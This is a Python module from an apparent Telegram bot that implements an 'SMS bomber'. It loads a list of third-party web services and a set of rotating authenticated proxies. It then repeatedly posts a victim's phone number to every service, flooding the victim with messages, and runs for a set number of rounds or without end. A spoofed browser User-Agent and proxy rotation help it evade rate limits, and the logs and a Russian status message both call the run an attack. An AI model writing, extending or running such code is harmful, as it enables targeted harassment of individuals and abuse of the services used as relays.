from json import loads
from asyncio import sleep
from random import choice

from pathlib import Path
from aiohttp import ClientSession, BasicAuth
from aiohttp.client_exceptions import ClientHttpProxyError

import yaml
from loguru import logger
from aiogram.types import Message
from objects.globals import bot
from models.models import *

SERVICES_DIR = PROXIES_DIR = Path(__file__).resolve().parent.parent.parent

class Phone:
    user_id: int
    phone: str

    def __init__(self, user_id, phone=""):
        self.is_process: bool = True
        self.user_id = user_id
        self.phone = phone
        self.count_circles: str = None
        self.bomber_data: BomberData = None
        self.session: ClientSession = ClientSession()
        self.headers = {"User-Agent": (
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_5_2) "
                "AppleWebKit/537.36 (KHTML, like Gecko) "
                "Chrome/93.0.4577.63 Safari/537.36"),
                "Accept": "*/*"}

    def load_services(self):
        CONFIG_NAME = r"%s/services.yaml" % SERVICES_DIR
        if not Path(CONFIG_NAME).exists():
            logger.error("Services file does not exists!")
        else:
            with open(CONFIG_NAME) as f:
                services = yaml.load(f, Loader=yaml.FullLoader)
            logger.info("Services loaded!")
            return services

    def load_proxies(self):
        PROXIES = r"%s/proxies.yaml" % PROXIES_DIR
        if not Path(PROXIES).exists():
            logger.error("Proxies file does not exists!")
        else:
            with open(PROXIES) as f:
                proxies = yaml.load(f, Loader=yaml.FullLoader)
            logger.info("Proxies laoded!")
            return proxies["PROXIES"]

    def proxy_format(self, proxy: str):
        proxy_split = proxy.split("@")
        url = proxy_split[0]
        username, password = proxy_split[1].split(":")
        return {"url": f"http://{url}", "username": username, "password": password}

    async def start(self, message: Message):
        self.bomber_data = await BomberData.objects.get(username=str(self.user_id))
        self.count_circles = self.bomber_data.circles
        self.services = self.load_services()
        logger.info("Attack started -> %s" % (self.user_id,))
        while self.is_process:
            proxy = self.proxy_format(choice(self.load_proxies()))
            proxy_auth = BasicAuth(proxy["username"], proxy["password"])
            for k,v in self.services.items():
                try:
                    if not v["formating"]:
                        if "data" in v:
                            data = (v["data"] % self.phone[-10:]).replace("'", "\"")
                            response = await self.session.post(url=k, data=loads(data),
                                headers=self.headers, timeout=3,
                                proxy=proxy["url"], proxy_auth=proxy_auth)
                        elif "json" in v:
                            json = (v["json"] % self.phone[-10:]).replace("'", "\"")
                            await self.session.post(url=k, json=loads(json),
                                headers=self.headers, timeout=3,
                                proxy=proxy["url"], proxy_auth=proxy_auth)
                    else:
                        await self.session.post(url=k % self.phone, timeout=3,
                            proxy=proxy["url"], proxy_auth=proxy_auth)
                except RuntimeError:
                    pass
                except ClientHttpProxyError as e:
                    proxy = f"%s@%s:%s" % (proxy["url"], proxy["username"], proxy["password"],)
                    logger.error(f"Proxy: {proxy}, , Error message -> {e}")
                except Exception as e:
                    error_name = e.__class__.__name__
                    if e.args:
                        error_message = e.args[0]
                    else:
                        error_message = "Unknow error"
                    logger.error(f"{error_name} -> {error_message}")

            if self.count_circles!="∞":
                self.count_circles = int(self.count_circles) - 1
                if self.count_circles == 0:
                    await self.bomber_data.update(circles=self.count_circles)
                    return await message.answer(text="❌Атака остановлена\n"f"🗑Количество кругов израсходовано!")
            await sleep(3)

    async def stop(self):
        await sleep(1)
        self.is_process = False
        if self.session is not None:
            logger.info("Attack stopped -> %s" % (self.user_id,))
            await self.session.close()